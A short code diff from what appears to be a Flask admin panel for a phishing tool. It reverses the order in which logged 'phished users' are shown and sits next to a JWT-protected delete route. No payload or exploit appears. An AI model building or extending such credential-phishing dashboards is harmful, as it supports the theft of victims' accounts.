@@ -16,7 +16,8 @@ def logs():
         phished_users = Phish.query.filter(Phish.platform.like(f"{platform}%"), Phish.phised_user.like(f"{username}%")).all()
     else:
         phished_users = Phish.query.all()
-    return render_template('logs.html', users=phished_users, username=current_user)
+    return render_template('logs.html', users=phished_users[::-1], username=current_user)
+
 @app.route('/logs/<int:id>/delete', methods=["GET"])
 @jwt_required
 def delete_log(id):
